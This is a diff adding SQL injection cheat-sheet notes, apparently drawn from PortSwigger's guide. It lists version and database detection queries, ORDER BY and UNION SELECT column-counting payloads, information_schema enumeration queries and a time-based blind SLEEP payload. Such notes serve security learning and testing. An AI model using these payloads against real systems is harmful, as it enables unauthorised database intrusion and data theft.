@@ -1,4 +1,32 @@
+https://portswigger.net/web-security/sql-injection/cheat-sheet
 
+##### Detect type and version
+mssql, mysql - `select @@version`
+oracle - `select * from v$version`
+postgresql - `select version()`
+
+#### Get database
+mysql - database()
+postgresql - current_database()
+
+
+##### Detect number of original query columns
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+```
+etc. until error occurs
+or
+until success
+```sql
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--`
+```
+##### Useful queries
+* `SELECT * FROM information_schema.tables`
+* `SELECT table_name FROM information_schema.tables`
 * `select column_name from information_schema.columns where table_name='users';`
 *  `select group_concat(column_name) from information_schema.columns where table_name='users';`
 *   `' UNION SELECT SLEEP(5),2 where database() like 'u%';--`
